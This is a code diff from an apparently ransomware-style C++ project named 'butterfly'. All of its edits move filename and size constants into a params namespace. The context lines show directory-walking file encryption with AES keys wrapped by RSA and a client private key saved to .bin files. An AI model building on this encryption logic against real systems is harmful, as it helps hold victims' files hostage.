@@ -45,7 +45,7 @@ void Encryptor::validateAESKeyLength()
 void Encryptor::saveUnencryptedAESKeyPair(const std::string &aesKeyPair)
 {
     // 32 Bytes AESKey + 16 Bytes IV
-    if ( !butterfly::writeBinFile(butterfly::UNENC_AESKEY_FILENAME, aesKeyPair.c_str(), static_cast<long>(aesKeyPair.length())) )
+    if ( !butterfly::writeBinFile(butterfly::params::UNENC_AESKEY_FILENAME, aesKeyPair.c_str(), static_cast<long>(aesKeyPair.length())) )
     {
         #ifdef LOGGING
         LOG_ERROR("Could not save the unencrypted AESKeyPair File to Filesystem!");
@@ -58,10 +58,10 @@ void Encryptor::saveUnencryptedAESKeyPair(const std::string &aesKeyPair)
 
 void Encryptor::checkIfEncryptionFilesExists()
 {
-    if ( butterfly::existsFile(butterfly::ENC_CPRIVATERSA_FILENAME) && butterfly::existsFile(butterfly::ENC_AESKEY_FILENAME) && butterfly::existsFile(butterfly::RSA_EKIV_FILENAME) )
+    if ( butterfly::existsFile(butterfly::params::ENC_CPRIVATERSA_FILENAME) && butterfly::existsFile(butterfly::params::ENC_AESKEY_FILENAME) && butterfly::existsFile(butterfly::params::RSA_EKIV_FILENAME) )
     {
         #ifdef LOGGING
-        LOG_ERROR("Aborting encryption because encryption files (" << butterfly::ENC_CPRIVATERSA_FILENAME << ", " << butterfly::ENC_AESKEY_FILENAME << ", " << butterfly::RSA_EKIV_FILENAME <<") already exists!")
+        LOG_ERROR("Aborting encryption because encryption files (" << butterfly::params::ENC_CPRIVATERSA_FILENAME << ", " << butterfly::params::ENC_AESKEY_FILENAME << ", " << butterfly::params::RSA_EKIV_FILENAME <<") already exists!")
         #else
         std::cerr << "Aborting encryption because encryption files already exists!" << std::endl;
         #endif
@@ -106,7 +106,7 @@ void Encryptor::invokeDir(const std::string &dirPath, bool protection)
         {
 
             // Compare file size with the MAX FILE SIZE
-            if ( butterfly::getFileSize(file.string(), true) > butterfly::MAX_FILE_SIZE )
+            if ( butterfly::getFileSize(file.string(), true) > butterfly::params::MAX_FILE_SIZE )
             {
                 #ifdef LOGGING
                 LOG_TRACE("Spawn a new encryption thread for file: " << file.string());
@@ -145,7 +145,7 @@ void Encryptor::encryptCPrivateRSA()
         std::string cPrivateRSAEnc = _rsaEncryptorCPrivateRSA->getEncryptedMessage();
 
         // Save the encrypted CPrivateRSA string to CPrivateRSA.bin
-        _rsaEncryptorCPrivateRSA->writeEncMSGToFile(butterfly::ENC_CPRIVATERSA_FILENAME, cPrivateRSAEnc, encMSGLen);
+        _rsaEncryptorCPrivateRSA->writeEncMSGToFile(butterfly::params::ENC_CPRIVATERSA_FILENAME, cPrivateRSAEnc, encMSGLen);
 
     } catch (RSAEncryptionException &e)
     {
@@ -184,7 +184,7 @@ void Encryptor::encryptFinalAESKeyWithRSA(const std::string &aesKeyPair)
         std::string aesKeyEnc = _rsaEncryptorAESKey->getEncryptedMessage();
 
         // Save the encrypted AES Key to AESKey.bin
-        _rsaEncryptorAESKey->writeEncMSGToFile(butterfly::ENC_AESKEY_FILENAME, aesKeyEnc, encMSGLen);
+        _rsaEncryptorAESKey->writeEncMSGToFile(butterfly::params::ENC_AESKEY_FILENAME, aesKeyEnc, encMSGLen);
 
     } catch (RSAEncryptionException &e)
     {
